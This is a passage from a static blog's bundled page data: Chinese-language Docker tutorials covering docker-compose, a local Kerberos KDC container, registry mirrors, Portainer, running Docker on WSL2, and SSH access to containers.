'},{title:"docker使用宿主机代理",frontmatter:{title:"docker使用宿主机代理",date:"2021-08-29T09:20:01.000Z",tags:["linux","docker"],categories:"deploy",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/docker/docker-container-proxy.html",relativePath:"blogs/docker/docker-container-proxy.md",key:"v-6b44efd6",path:"/blogs/docker/docker-container-proxy.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 使用网络模式： --network=host \n docker run -it --network = host --name = "Host-Proxy-Test"  ubuntu:16.04\n\n \n 1 2 #  docker-compose 方式 \n version :   "3" \n services : \n   web : \n     user :  root                                  # 为了避免一些权限问题 在这我使用了root \n     restart :  always                             # 重启方式 \n     image :  jenkins/jenkins : lts                  # 指定服务所使用的镜像 在这里我选择了 LTS (长期支持) \n     container_name :  jenkins                     # 容器名称 \n     volumes :                                     # 卷挂载路径 \n       -  /home/ubuntu/jenkins/jenkins_home/ : /var/jenkins_home   # 这是我们一开始创建的目录挂载到容器内的jenkins_home目录 \n       -  /var/run/docker.sock : /var/run/docker.sock\n       -  /usr/bin/docker : /usr/bin/docker                 # 这是为了我们可以在容器内使用docker命令 \n       -  /usr/local/bin/docker - compose : /usr/local/bin/docker - compose\n     network_mode :  host\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 docker-compose up -d\n \n 1 '},{title:"docker-compose command 执行多条指令",frontmatter:{title:"docker-compose command 执行多条指令",date:"2021-12-19 17:46:23",tags:["docker","docker-compose","command"],categories:"docker-compose",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/docker/docker_compose_command.html",relativePath:"blogs/docker/docker_compose_command.md",key:"v-1b819156",path:"/blogs/docker/docker_compose_command.html",headers:[{level:2,title:"/bin/bash -c 字符串方式",slug:"bin-bash-c-字符串方式"},{level:2,title:"/bin/bash -c 配置文件方式",slug:"bin-bash-c-配置文件方式"},{level:3,title:"串行运行",slug:"串行运行"},{level:3,title:"并行运行",slug:"并行运行"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' /bin/bash -c 字符串方式 \n services : \n   prj1 : \n     build : \n       context :  .\n       dockerfile :  Dockerfile.prj1\n     environment : \n       SERVER_LISTEN_URI :   "tcp://0.0.0.0:9000" \n     #执行多条指令 \n     command :  /bin/bash  - c "cp /app/dtest/config.default.yml /app/config.yml  &&  python  - u /app/dtest/tcc.py"\n     #目录映射 \n     volumes : \n       -  .. : /app\n       -  ./tmp : /var/tmp\n     ports : \n       -   "9000:9000" \n     links : \n       -  redis\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 另一个示例： \n command :  /bin/bash  - c " while true; do sleep 1; done"\n \n 1 #  /bin/bash -c 配置文件方式 \n 串行运行 \n 如果这几个命令是没有要求并行运行，则配置如下 \n command : \n     -  sh\n     -   - c\n     -   | \n        cmd1\n        cmd2\n        cmd3 \n \n 1 2 3 4 5 6 7 如上配置会按顺序执行cmd1，之后再执行cmd2，之后cmd3。对于可以串行的命令，这样即可。 \n 并行运行 \n 有时候想配置几个常驻脚本在docker，希望这几个脚本一起跑起来（并行运行），上述1的办法就不行了。\nLinux 把命令行扔后台运行的一个办法就是在后面加上 &， \n command : \n     -  sh\n     -   - c\n     -   | \n        cmd1 &\n        cmd2 &\n        cmd3 \n \n 1 2 3 4 5 6 7 '},{title:"docker-compose生成的容器立刻退出, exited with code 0",frontmatter:{title:"docker-compose生成的容器立刻退出, exited with code 0",date:"2021-12-18 14:48:26",tags:["docker","docker-compose"],categories:"deploy",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/docker/docker_create_container_exit.html",relativePath:"blogs/docker/docker_create_container_exit.md",key:"v-42382335",path:"/blogs/docker/docker_create_container_exit.html",headers:[{level:2,title:"问题",slug:"问题"},{level:2,title:"解决",slug:"解决"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 问题 \n 通过自己编写的docker-compose.yml管理项目。\n但是生成的容器却立刻退出 \n 解决 \n Docker镜像的缺省命令是bash，如果不加 -it,bash命令执行了自动会退出，加-it后docker命令会为容器分配一个伪终端，并接管其stdin/stdout支持交互操作，这时候bash命令不会自动退出\n像不使用docker-compose,我们会执行类似如下的命令\ndocker run -it --name node node\n但docker-compose需要额外配置下\n需要在docker-compose.yml中包含以下行: \n stdin_open :   true \n tty :   true \n \n 1 2 第一个对应于docker run中的 -i ,第二个对应于 -t . \n"},{title:"docker本地构建kerberos 单机环境",frontmatter:{title:"docker本地构建kerberos 单机环境",date:"2021-10-23 12:59:34",tags:["docker","kerberos","kdc","authentication"],categories:"security",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/docker/docker_create_kerberos_kdc.html",relativePath:"blogs/docker/docker_create_kerberos_kdc.md",key:"v-2193b535",path:"/blogs/docker/docker_create_kerberos_kdc.html",headers:[{level:2,title:"kerberos简介",slug:"kerberos简介"},{level:2,title:"kerberos 原理",slug:"kerberos-原理"},{level:2,title:"Kerberos（KDC） 几个重要的概念：",slug:"kerberos-kdc-几个重要的概念"},{level:2,title:"创建配置文件",slug:"创建配置文件"},{level:3,title:"创建文件夹/home/ubuntu/docker/kerberos",slug:"创建文件夹-home-ubuntu-docker-kerberos"},{level:3,title:"创建下面目录",slug:"创建下面目录"},{level:3,title:"修改配置文件",slug:"修改配置文件"},{level:2,title:"打包docker镜像",slug:"打包docker镜像"},{level:2,title:"docker启动及初始化",slug:"docker启动及初始化"},{level:3,title:"启动",slug:"启动"},{level:3,title:"添加管理权限",slug:"添加管理权限"},{level:2,title:"kerberos client",slug:"kerberos-client"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' kerberos简介 \n 众所周知,kerberos是大数据环境下最常用的安全通信的保障机制,是一种网络协议\n本文不涉及kerberos原理,只涉及docker搭建kerberos环境 \n kerberos 原理 \n \n Kerberos 原理 \n \n Kerberos 原理 \n \n 使用 Kerberos 进行网络身份验证 \n \n 使用 Kerberos 进行网络身份验证 \n Kerberos（KDC） 几个重要的概念： \n \n Principal：任何服务器所提供的用户、计算机、服务都将被定义成Principal。 \n Instances：用于服务principals和特殊管理Principal。 \n Realms：Kerberos安装提供的独特的域的控制，把它想象成你的主机和用户所属的主机或者组。官方约定这域需要大写。默认的，Ubuntu将把DNS域名转换为大写当成这里的域。 本例使用 \n Key Distribution Center: （KDC）由三部分组成，一是principal数据库，认证服务器，和票据授予服务器。每个Realm至少要有一个。 \n Ticket Granting Ticket：由认证服务器（AS）签发，Ticket Granting Ticket (TGT)使用用户的密码加密，这个密码只有用户和KDC知道。 \n Ticket Granting Server: (TGS) 根据请求签发服务的票据。 \n Tickets：确认两个Principal的身份。一个主体是用户，另一个是由用户请求的服务。门票会建立一个加 *** ，用于在身份验证会话中的安全通信。 \n Keytab Files：从KDC主数据库中提取的文件，并且包含的服务或主机的加***。 \n 创建配置文件 \n 创建文件夹/home/ubuntu/docker/kerberos \n mkdir /home/ubuntu/docker/kerberos\n \n 1 #  创建下面目录 \n .\n├── ./conf\n│   ├── ./conf/hosts\n│   ├── ./conf/kadm5.acl\n│   ├── ./conf/kdc.conf\n│   └── ./conf/krb5.conf\n├── ./Dockerfile\n└── ./keytab\n    └── ./keytab/\n \n 1 2 3 4 5 6 7 8 9 #  修改配置文件 \n \n ./conf/hosts \n \n 127.0.0.1\tlocalhost\n::1\tlocalhost ip6-localhost ip6-loopback\nfe00::0\tip6-localnet\nff00::0\tip6-mcastprefix\nff02::1\tip6-allnodes\nff02::2\tip6-allrouters\n172.18.0.4\tef6d55663265\n127.0.0.1 kdc\n \n 1 2 3 4 5 6 7 8 \n ./conf/kadm5.acl \n \n cloudera-scm/admin@HADOOP.COM\t*\n \n 1 \n ./conf/kdc.conf \n \n [kdcdefaults]\n kdc_ports = 88\n kdc_tcp_ports = 88\n\n[realms]\n HADOOP.COM = {\n  #master_key_type = aes256-cts\n  acl_file = /var/kerberos/krb5kdc/kadm5.acl\n  dict_file = /usr/share/dict/words\n  admin_keytab = /var/kerberos/krb5kdc/kadm5.keytab\n  max_renewable_life = 7d\n  supported_enctypes = aes128-cts:normal des3-hmac-sha1:normal arcfour-hmac:normal camellia256-cts:normal camellia128-cts:normal des-hmac-sha1:normal des-cbc-md5:normal des-cbc-crc:normal\n }\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 \n ./conf/krb5.conf \n \n includedir /etc/krb5.conf.d/\n\n[logging]\n default = FILE:/var/log/krb5libs.log\n kdc = FILE:/var/log/krb5kdc.log\n admin_server = FILE:/var/log/kadmind.log\n\n[libdefaults]\n dns_lookup_kdc = false\n dns_lookup_realm = false\n ticket_lifetime = 24h\n renew_lifetime = 7d\n forwardable = true\n default_realm = HADOOP.COM\n udp_preference_limit = 1\n[realms]\n HADOOP.COM = {\n  kdc = kdc\n  admin_server = kdc\n }\n\n[domain_realm]\n .hadoop.com = HADOOP.COM\n hadoop.com = HADOOP.COM\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \n ./Dockerfile \n \n FROM centos:7\nRUN yum install -y krb5-server krb5-libs krb5-auth-dialog krb5-workstation\nCMD ["/usr/sbin/init"]\n \n 1 2 3 #  打包docker镜像 \n cd  /home/ubuntu/docker/kerberos  &&   sudo  docker build -t kdc:1.0  . \n \n 1 等待打包构建镜像,因为涉及到kerberos的下载安装,可能会比较慢\n使用docker images命令可以看到新生成的docker镜像 \n docker启动及初始化 \n 启动 \n docker run --privileged=true -p 88:88 -p 749:749 -p 750:750 -d --name="my_kdc" -v /home/ubuntu/docker/kerberos/conf/kdc.conf:/var/kerberos/krb5kdc/kdc.conf -v /home/ubuntu/docker/kerberos/conf/krb5.conf:/etc/krb5.conf -v /home/ubuntu/docker/kerberos/conf/hosts:/etc/hosts -v /home/ubuntu/docker/kerberos/conf/kadm5.acl:/var/kerberos/krb5kdc/kadm5.acl -v /home/ubuntu/docker/kerberos/keytab:/keytab/ kdc:1.0\n \n 1 \n 首先进入容器的bash \n \n sudo  docker  exec  -it my_kdc  bash \n \n 1 rm /var/kerberos/krb5kdc/principal* \n \n 初始化数据库 \n \n kdb5_util create -s -r HADOOP.COM\npassword => password \n\nkdb5_util create -s -r HADOOP.COM -P password\n \n 1 2 3 4 \n 启动kdc \n \n systemctl start kadmin krb5kdc\n \n 1 \n 查看状态 \n \n systemctl status kadmin\nsystemctl status krb5kdc\n \n 1 2 #  添加管理权限 \n \n 进入kadmin交互命令行 \n \n kadmin.local\n \n 1 \n 增加管理员用户并设置密码 \n \n addprinc cloudera-scm/admin@HADOOP.COM\npassword => password \n\naddprinc -pw password cloudera-scm/admin@HADOOP.COM\n \n 1 2 3 4 \n 测试连接是否成功 \n \n kinit cloudera-scm/admin@HADOOP.COM\n \n 1 \n 增加普通用户并设置密码 \n \n addprinc hdfs/kdc@HADOOP.COM\npassword => password \n\naddprinc -pw password hdfs/kdc@HADOOP.COM\n \n 1 2 3 4 \n 测试连接是否成功 \n \n kinit hdfs/kdc@HADOOP.COM\n \n 1 \n 查看用户列表 \n \n listprincs\n \n 1 \n 删除用户 \n使用管理员用户 \nkinit cloudera-scm/admin@HADOOP.COM\n\nkadmin\ndelete_principal test/kdc@HADOOP.COM\n \n 1 2 3 4 5 \n 导出keytab文件到指定目录 \n \n ktadd -k /keytab/admin.keytab -norandkey cloudera-scm/admin@HADOOP.COM\nktadd -k /keytab/hdfs.keytab -norandkey hdfs/kdc@HADOOP.COM\n \n 1 2 #  kerberos client \n \n 安装客户端(ubuntu) \n \n apt-get   install  krb5-user -y\n \n 1 \n 设置配置/etc/krb5.conf配置和server端保持一致 \n \n cat   >  /etc/krb5.conf  <<   EOF\n[libdefaults]\ndefault_realm = CLOUDERA\ndns_lookup_kdc = false\ndns_lookup_realm = false\nticket_lifetime = 86400\nrenew_lifetime = 604800\nforwardable = true\ndefault_tgs_enctypes = aes128-cts\ndefault_tkt_enctypes = aes128-cts\npermitted_enctypes = aes128-cts\nudp_preference_limit = 1\nkdc_timeout = 3000\n[realms]\nCLOUDERA = {\nkdc = quickstart.cloudera\nkdc = 110.42.214.104\nadmin_server = quickstart.cloudera\n}\nHADOOP.COM = {\n#kdc = kdc\nkdc = 110.40.137.191\nadmin_server = kdc\n}\nEOF \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \n 使用用户名和密码的方式验证kerberos配置在客户端通过用户名和密码认证 \n \n kinit hdfs/kdc@HADOOP.COM\npassword => password \n \n 1 2 \n 通过密钥登陆 \n \n kinit -kt /keytab/hdfs.keytab hdfs/kdc@HADOOP.COM\n \n 1 \n 查看principal \n \n klist -k hdfs.keytab\n \n 1 '},{title:"linux配置docker镜像源",frontmatter:{title:"linux配置docker镜像源",date:"2021-07-25T23:47:27.000Z",tags:["linux"],categories:"deploy",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/docker/docker_trDOVg3Zk.html",relativePath:"blogs/docker/docker_trDOVg3Zk.md",key:"v-18da1455",path:"/blogs/docker/docker_trDOVg3Zk.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 创建或修改 /etc/docker/daemon.json 文件，并写入以下内容： \n vim  /etc/docker/daemon.json\n \n 1 { \n    "registry-mirrors" :   [ \n        "https://0hgxc31r.mirror.aliyuncs.com" , \n        "https://docker.mirrors.ustc.edu.cn/" , \n        "https://hub-mirror.c.163.com/" , \n        "https://reg-mirror.qiniu.com" , \n        "https://mirror.ccs.tencentyun.com" \n   ] \n } \n \n 1 2 3 4 5 6 7 8 9 #  依次执行以下命令，重新启动 Docker 服务。 \n systemctl daemon-reload\n service  docker restart\n \n 1 2 #  检查是否生效 \n docker info\n \n 1 #  在返回信息最底下有如下信息则表示成功 \n Registry Mirrors:\n   https://0hgxc31r.mirror.aliyuncs.com\n   https://docker.mirrors.ustc.edu.cn/\n   https://hub-mirror.c.163.com/\n   https://reg-mirror.qiniu.com\n   https://mirror.ccs.tencentyun.com\n \n 1 2 3 4 5 6 '},{title:"使用docker安装ubuntu镜像",frontmatter:{title:"使用docker安装ubuntu镜像",date:"2021-07-17T19:34:37.000Z",tags:["docker","linux"],categories:"deploy",published:!0,hideInList:!1,feature:"/post-images/fl2jBQKOX.png",isTop:!1},regularPath:"/blogs/docker/fl2jBQKOX.html",relativePath:"blogs/docker/fl2jBQKOX.md",key:"v-0d4945d5",path:"/blogs/docker/fl2jBQKOX.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 查找Ubuntu镜像 \n docker search ubuntu\n \n 1 安装Ubuntu镜像 \n docker pull ubuntu\n \n 1 查看docker镜像 \n docker images\n \n 1 运行docker镜像 \n docker run -it -d -p  '8090:80'   --name ubuntu -v D:/docker/share:/docker/share ubuntu_havedocker:1.0\n \n 1 -name自定义容器名，-p指定端口映射，前者为虚拟机端口，后者为容器端口,成功后返回id\n查看所有启动的容器(查看所有容器加 -a) \n docker  ps \n \n 1 根据id查看容器信息 \n docker images\n \n 1 进入docker(或者把容器id改为容器名，也可以进入) \n docker  exec  -it  [ id ]  /bin/bash\n \n 1 容器里面也是ubuntu虚拟机，同样适用Linux命令\n退出容器 \n exit \n \n 1 停止容器 \n docker stop  [ id ] \n \n 1 制作docker镜像 \n docker commit  [ id ]  ubuntu_test1:1.0\n \n 1 1.0为版本号，需要添加，镜像名字随意\n查看镜像是否创建 \n 此时镜像只能本地使用，在其他机器使用需打包\n打包镜像并查看 \n docker save -o ubuntu_test1.tar ubuntu_test1:1.0\n \n 1 "},{title:"WIndows 10 Docker desktop create Sql Server 2019 engine",frontmatter:{title:"WIndows 10 Docker desktop create Sql Server 2019 engine",date:"2021-07-11T11:24:22.000Z",tags:["docker","SQL Server"],categories:"database",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/docker/funVxpRfy.html",relativePath:"blogs/docker/funVxpRfy.md",key:"v-7e22e792",path:"/blogs/docker/funVxpRfy.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" cmd 运行 \n docker run -e  'ACCEPT_EULA=Y'  -e  'SA_PASSWORD=!SqlServer2'  -p  1433 :1433 -d mcr.microsoft.com/mssql/server:2019-latest\n \n 1 "},{title:"windows docker 挂载本地文件、文件夹并运行Containers",frontmatter:{title:"windows docker 挂载本地文件、文件夹并运行Containers",date:"2021-07-11T19:46:13.000Z",tags:["docker"],categories:"deploy",published:!0,hideInList:!1,feature:"/post-images/gk6-dFbkZ.png",isTop:!1},regularPath:"/blogs/docker/gk6-dFbkZ.html",relativePath:"blogs/docker/gk6-dFbkZ.md",key:"v-d63b1f8a",path:"/blogs/docker/gk6-dFbkZ.html",headers:[{level:2,title:"Angular",slug:"angular"},{level:2,title:"Java",slug:"java"},{level:2,title:"Angular",slug:"angular-2"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 使用docker模式 \n Angular \n docker run -d -p  \'80:80\'  --name angular-ts-demo2 -v /home/ubuntu/docker/angular-ts-demo/dist/my-app:/usr/share/nginx/html -v /home/ubuntu/docker/config/nginx/nginx.conf:/etc/nginx/nginx.conf:ro -d nginx:mainline-alpine\n \n 1 #  Java \n 使用docker-compose 方式 \n 在项目根目录新建 docker-compose.yml 文件 \n Angular \n web : \n   image :  nginx\n   volumes : \n    -  ./www : /usr/share/nginx/html\n   ports : \n    -   "8080:80" \n   environment : \n    -  NGINX_HOST=foobar.com\n    -  NGINX_PORT=80\n \n 1 2 3 4 5 6 7 8 9 然后 cmd执行 \n docker-compose -f  "docker-compose.yml"  up -d --build\n \n 1 #  总结 \n \n \n 容器目录不可以为相对路径 \ndocker run -it -v /test:soft centos /bin/bash \ninvalid value  "/test:soft"   for  flag -v: soft is not an absolute path\nSee  \'docker run --help\' . \n \n 1 2 3 直接报错，提示soft不是一个绝对路径，所谓的绝对路径，必须以下斜线“/”开头。 \n \n \n 宿主机目录如果不存在，则会自动生成\n如果宿主机中存在/test目录，首先删除它 \n [ root@localhost ~ ] # rm -rf /test \n [ root@localhost ~ ] # ls / \nbin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var\n \n 1 2 3 启动容器 \n [ root@localhost ~ ] # docker run -it -v /test:/soft centos /bin/bash \n [ root@a487a3ca7997 / ] # ls \nbin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  soft  srv  sys  tmp  usr  var\n \n 1 2 3 查看宿主机，发现新增了一个/test目录 \n [ root@localhost ~ ] # ls / \nbin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys   test   tmp  usr  var\n \n 1 2 \n \n'},{title:"Windows 10 Docker desktop 初始设置",frontmatter:{title:"Windows 10 Docker desktop 初始设置",date:"2021-07-11T11:07:53.000Z",tags:["docker"],categories:"deploy",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/docker/jlMpUapWA.html",relativePath:"blogs/docker/jlMpUapWA.md",key:"v-776b2711",path:"/blogs/docker/jlMpUapWA.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' docker desktop 设置 \n Settings  => Docker Engine \n { \n   "registry-mirrors" :   [ \n     "https://0hgxc31r.mirror.aliyuncs.com" , \n     "https://docker.mirrors.ustc.edu.cn/" , \n     "https://hub-mirror.c.163.com/" , \n     "https://reg-mirror.qiniu.com" \n   ] , \n   "insecure-registries" :   [ ] , \n   "debug" :   false , \n   "experimental" :   true , \n   "features" :   { \n     "buildkit" :   true \n   } , \n   "builder" :   { \n     "gc" :   { \n       "enabled" :   true , \n       "defaultKeepStorage" :   "20GB" \n     } \n   } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #  Vmmen  设置 \n C:\\Users<username> 利用新建 .wslconfig文件 \n [wsl2]\nmemory=2GB\nswap=0\nlocalhostForwarding=true\n \n 1 2 3 4 '},{title:'Docker error "Ports are not available" on Windows 10',frontmatter:{title:'Docker error "Ports are not available" on Windows 10 ',date:"2021-07-11T11:22:19.000Z",tags:["docker"],categories:"deploy",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/docker/mtktwAkOk.html",relativePath:"blogs/docker/mtktwAkOk.md",key:"v-1e525989",path:"/blogs/docker/mtktwAkOk.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" cmd 管理员运行 \n net stop winnat\nnet start winnat\n \n 1 2 "},{title:"docker 可视化管理 Portainer",frontmatter:{title:"docker 可视化管理 Portainer",date:"2021-07-11T11:48:29.000Z",tags:["docker"],categories:"deploy",published:!0,hideInList:!1,feature:"/post-images/p4DvMnCaf.jpg",isTop:!1},regularPath:"/blogs/docker/p4DvMnCaf.html",relativePath:"blogs/docker/p4DvMnCaf.md",key:"v-4f2ac141",path:"/blogs/docker/p4DvMnCaf.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" Portainer Server Deployment \n docker volume create portainer_data\ndocker run -d -p  8000 :8000 -p  9000 :9000 --name = portainer --restart = always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce\n \n 1 2 #  Portainer Agent Only Deployment \n docker run -d -p  9001 :9001 --name portainer_agent --restart = always -v /var/run/docker.sock:/var/run/docker.sock -v /var/lib/docker/volumes:/var/lib/docker/volumes portainer/agent\n \n 1 "},{title:"Running Docker on WSL2 without Docker Desktop",frontmatter:{title:"Running Docker on WSL2 without Docker Desktop",date:"2021-12-19 16:47:17",tags:["docker","wsl2","windows"],categories:"docker",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/docker/run-docker-on-wsl2.html",relativePath:"blogs/docker/run-docker-on-wsl2.md",key:"v-5c6d1015",path:"/blogs/docker/run-docker-on-wsl2.html",headers:[{level:2,title:"What you will get",slug:"what-you-will-get"},{level:2,title:"What you will not get",slug:"what-you-will-not-get"},{level:2,title:"Requisites",slug:"requisites"},{level:2,title:"Guide",slug:"guide"},{level:2,title:"Bonus",slug:"bonus"},{level:2,title:"Final considerations",slug:"final-considerations"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' So, now that Docker Desktop is paid under certain scenarios, you may want to switch to something else.\nThis is a straight to the point guide on how to make Docker CE run fully on WSL2. \n What you will get \n A full-fledged Docker installation on WSL2\nDocker Daemon automatic start without any crazy hacks \n What you will not get \n Docker Daemon sharing between Windows and WSL (i.e. you cannot run docker from Windows PowerShell)\nDocker Daemon sharing between WSL distributions \n Requisites \n I will consider that you already have WSL2 working, and you are using Ubuntu as your distribution. \n Guide \n \n Install Docker CE on Ubuntu by following the  official guide : \nEnsures not older packages are installed \n sudo   apt-get  remove docker docker-engine docker.io containerd runc\nEnsure pre-requisites are installed \n sudo   apt-get  update\n sudo   apt-get   install   \\ \n  apt-transport-https  \\ \n  ca-certificates  \\ \n   curl   \\ \n  gnupg  \\ \n  lsb-release\nAdds docker apt repository \n echo   \\ \n     "deb [arch= $( dpkg --print-architecture )  signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu  $( lsb_release -cs )  stable"   | \n     sudo   tee  /etc/apt/sources.list.d/docker.list  >  /dev/null\nAdds docker apt key \n curl  -fsSL https://download.docker.com/linux/ubuntu/gpg  | \n     sudo  gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg\nRefreshes apt repos \n sudo   apt-get  update\nInstalls Docker CE \n sudo   apt-get   install  docker-ce docker-ce-cli containerd.io\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \n Perform the  post-installation steps : \nEnsures docker group exists \n sudo   groupadd  docker\nEnsures you are part of it \n sudo   usermod  -aG docker  $USER \nNow, close your shell and open another for taking the group changes into account \n \n 1 2 3 4 5 6 7 \n Make Docker Daemon start on WSL initialization:\nIf you are enrolled in Windows Insiders, you can use a brand-new feature of WSL to start the Docker Daemon during the initialization. You only need to add: \n \n [ boot ] \ncommand = "service docker start"\n \n 1 2 To your  /etc/wsl.conf  within your WSL distribution. Then, restart it with  wsl.exe --shutdown . To verify that it works, you can run  docker version . If you do not receive any permission denied error, you are good. \n But if you are not enrolled in Windows Insiders, you can achieve a similar result with the following approach:\nOpen the ~/.profile (or ~/.zprofile if you are using ZSH rather than Bash) in your WSL distribution, and add a section like so to it: \n if   service  docker status  2 > &1   |   grep  -q  "is not running" ;   then \n    wsl.exe -d  " ${WSL_DISTRO_NAME} "  -u root -e /usr/sbin/service docker start  > /dev/null  2 > &1 \n fi \n \n 1 2 3 This piece of code will run every time you open a new shell on your WSL distribution. It checks whether the Docker Daemon is running, and if not, starts it without prompting for credentials. Without any noticeable delay. \n To verify, after making the changes, open a new shell and run the docker version command. If you do not receive any permission denied error, you are good. \n If you are unsure about which method to choose, you can choose both. It\'s harmless, I do it on mine. \n Bonus \n \n Installing Docker Compose (v2+): \nFinds the latest version \n compose_version = $( curl  -fsSL -o /dev/null -w  "%{url_effective}"  https://github.com/docker/compose/releases/latest  |   xargs   basename ) \nDownloads the binary to the plugins folder \n curl  -fL --create-dirs -o /usr/local/bin/docker-compose  \\ \n     "https://github.com/docker/compose/releases/download/ ${compose_version} /docker-compose-linux- $( uname  -m ) " \nAssigns execution permission to it \n chmod  +x /usr/local/bin/docker-compose\n \n 1 2 3 4 5 6 7 8 9 To verify it works you can run  docker compose version . \n \n Installing Docker Compose Switch (to use the docker-compose command): \nFinds the latest version \n switch_version = $( curl  -fsSL -o /dev/null -w  "%{url_effective}"  https://github.com/docker/compose-switch/releases/latest  |   xargs   basename ) \nDownloads the binary \n sudo   curl  -fL -o /usr/local/bin/docker-compose  \\ \n     "https://github.com/docker/compose-switch/releases/download/ ${switch_version} /docker-compose-linux- $( dpkg --print-architecture ) " \nAssigns execution permission to it \n sudo   chmod  +x /usr/local/bin/docker-compose\n \n 1 2 3 4 5 6 7 8 9 PS: I suggest to install the  docker-compose  to  /usr/local/bin/  because otherwise, the VS Code - Remote Containers extension will not find it. \n To verify it works, you can run  docker-compose version . \n \n Install the Docker Credential Helper: \n \n You will need this if you want Docker to store your credentials securely when you perform docker login. Thanks to the WSL interoperability between Windows, you can install the Windows version of the Docker Credential Helper inside of WSL itself. \nFinds the latest version \n wincred_version = $( curl  -fsSL -o /dev/null -w  "%{url_effective}"  https://github.com/docker/docker-credential-helpers/releases/latest  |   xargs   basename ) \nDownloads and extracts the .exe \n sudo   curl  -fL  \\ \n     "https://github.com/docker/docker-credential-helpers/releases/download/ ${wincred_version} /docker-credential-wincred- ${wincred_version} - $( dpkg --print-architecture ) .zip"   | \n    zcat  |   sudo   tee  /usr/local/bin/docker-credential-wincred.exe  > /dev/null\nAssigns execution permission to it \n sudo   chmod  +x /usr/local/bin/docker-credential-wincred.exe\n \n 1 2 3 4 5 6 7 8 9 10 Then, configure your Docker CLI to use it by assuring that the following is present in your  ~/.docker/config.json : \n { \n     "credsStore" :   "wincred.exe" \n } \n \n 1 2 3 To verify that it works, you can try to  docker login  and if not, Docker will complain about storing credentials in plain text \n \n Enabling Docker BuildKit: \n \n As it came enabled by Docker Desktop before. It\'s simple, ensure that the following is present in your  /etc/docker/daemon.json : \n { \n     "features" :   { \n         "buildkit" :   true \n     } \n } \n \n 1 2 3 4 5 You will need to edit this file as root, so make sure to use  sudo  before running your editor ( sudo vim /etc/docker/daemon.json ). \n Final considerations \n The entire setup process may take some time, but you will have achieved almost everything that Docker Desktop used to provide to you (by the way, I use  kind  as an alternative to Docker Desktop\'s built-in K8s). \n However, you can achieve a similar (and even higher/better) level of easiness that Docker Desktop provided to you by wrapping all the steps above in your dotfiles installation steps. \n For example, in this  dotfiles , every single of these steps are automated, including configuring /etc/docker/daemon.json, changing ~/.profile, and even providing a way to automatically update your extra binaries (docker-compose, or the wincred.exe) every time you update your dotfiles (by using a feature of chezmoi - a dotfiles manager which I totally recommend). \n'},{title:"Use SSH to Connect to a Docker Container",frontmatter:{title:"Use SSH to Connect to a Docker Container",date:"2021-07-17T20:30:19.000Z",tags:["linux","docker","ssh"],categories:"deploy",published:!0,hideInList:!1,feature:"/post-images/s1Qy_PHb2.jpg",isTop:!1},regularPath:"/blogs/docker/s1Qy_PHb2.html",relativePath:"blogs/docker/s1Qy_PHb2.md",key:"v-104df23e",path:"/blogs/docker/s1Qy_PHb2.html",headers:[{level:2,title:"Enable SSH on Ubuntu 18.04:",slug:"enable-ssh-on-ubuntu-18-04"},{level:2,title:"Enable SSH on CentOS 7:",slug:"enable-ssh-on-centos-7"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" You can connect to a Docker container using SSH (Secure Shell). Normally, SSH is used to connect remotely over a network to a server. The technology works the same when connecting to a virtual Docker container on your system. \n Step 1: Enable SSH on System \n Start by installing and enabling the SSH service: \n Enable SSH on Ubuntu 18.04: \n sudo apt-get install ssh\nsudo systemctl ssh start\nsudo systemctl ssh enable\nservice ssh status\n \n 1 2 3 4 #  Enable SSH on CentOS 7: \n yum –y  install  openssh-server openssh-clients\n service  sshd start\n service  sshd  enable \n service  sshd status\n \n 1 2 3 4 Step 2: Get IP Address of Container\nGet the container’s IP address by using the docker inspect command and filtering out the results. \n For modern Docker engines, use the command: \n sudo  docker inspect -f  \"{{ .NetworkSettings.IPAddress }}\"  container_name\n \n 1 For older Docker engines, run: \n docker inspect -f  '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}'  container_name\n \n 1 "},{title:"传输文件到 docker 容器",frontmatter:{title:"传输文件到 docker 容器",date:"2021-10-09 23:37:07",tags:["docker"],categories:"deploy",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/docker/send_file_to_docker.html",relativePath:"blogs/docker/send_file_to_docker.md",key:"v-292b35b3",path:"/blogs/docker/send_file_to_docker.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 